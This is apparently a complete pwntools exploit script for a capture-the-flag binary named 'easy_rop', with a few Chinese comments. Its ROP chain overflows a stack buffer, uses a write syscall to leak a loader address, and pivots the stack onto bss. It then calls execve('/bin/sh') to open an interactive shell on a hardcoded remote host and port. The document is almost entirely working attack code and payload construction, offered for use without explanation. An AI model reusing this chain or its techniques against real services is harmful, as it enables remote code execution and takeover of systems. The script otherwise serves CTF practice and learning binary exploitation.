from hashlib import new
from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./easy_rop.patch"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)
ld = ELF("./libc.so.6")

if not f_remote:
    io = process([vuln_path])
else:
    io = remote("74.207.229.59", 20222)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()




"""
(pip_venv) ➜  ez_rop ROPgadget --binary ./easy_rop|grep pop|grep ret
0x00000000004010eb : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401127 : add eax, 0x4855c35d ; mov ebp, esp ; pop rdi ; pop rbp ; ret
0x000000000040112d : in eax, 0x5f ; pop rbp ; ret
0x00000000004010e6 : mov byte ptr [rip + 0x2f23], 1 ; pop rbp ; ret
0x000000000040112c : mov ebp, esp ; pop rdi ; pop rbp ; ret
0x000000000040112b : mov rbp, rsp ; pop rdi ; pop rbp ; ret
0x00000000004010ed : pop rbp ; ret
0x000000000040112e : pop rdi ; pop rbp ; ret
0x000000000040112a : push rbp ; mov rbp, rsp ; pop rdi ; pop rbp ; ret
0x000000000040101a : ret
"""
new_stack = 0x404000+0x200
syscall = 0x401126
pop_rdi_rbp = 0x40112e
ret = 0x40101a

payload = b""
payload += b"a"*0x20 + p64(0)
payload += p64(elf.symbols["main"]) # recv "1" -> rax=1
payload += p64(pop_rdi_rbp)
payload += p64(1)   # rdi for syscall write
payload += p64(0)
payload += p64(syscall) # write 
payload += p64(0)
payload += p64(elf.symbols["main"])

payload = payload.ljust(0x80-8, b"t")
ddebug("b *0x401129\ncontinue\n")
io.send(payload)

sleep(0.1)
io.send(b"1")



io.recvn(0x70)
ld_offset = u64(io.recv(0x8)) 
log.success("ld:-----> " + hex(ld_offset))
ld.address = ld_offset - 0x3a000
log.success("ld:-----> " + hex(ld.address))

"""
mov rax, 59      ; syscall number for execve
mov rdi, path    ; address of the filename (e.g., "/bin/sh")
mov rsi, argv    ; address of argument array (e.g., [ NULL])
mov rdx, envp    ; address of environment array (can be NULL)
syscall
"""

"""
0x000000000000154f : leave ; ret
0x0000000000014f3c : pop rax ; ret
0x00000000000209fb : pop rdx ; leave ; ret
0x0000000000024a46 : pop rsi ; ret
"""

lev_ret =  ld.address + 0x154f
pop_rdx_lev_ret = ld.address + 0x209fb
pop_rax = ld.address + 0x14f3c
pop_rsi = ld.address + 0x24a46

payload = b""
payload += b"a" * 0x20
payload += p64(new_stack)  #新栈地址, -20为/bin/sh地址
payload += p64(0x40110a) # mian跳过push rbp,mov rbp,rsp,直接读到bss上
payload += p64(0)
payload += p64(pop_rdi_rbp) #?
payload += p64(0)
payload += p64(new_stack)
payload += p64(pop_rdx_lev_ret) # 栈迁移
payload += p64(0)
payload += p64(new_stack)   #rsp
payload += p64(0) #rbp
payload += p64(new_stack+0x8)

payload = payload.ljust(0x80)

io.send(payload)

payload = b"/bin/sh\x00"
payload += p64(0) * 4
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi_rbp)
payload += p64(new_stack-0x20)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)

io.send(payload)

io.interactive()
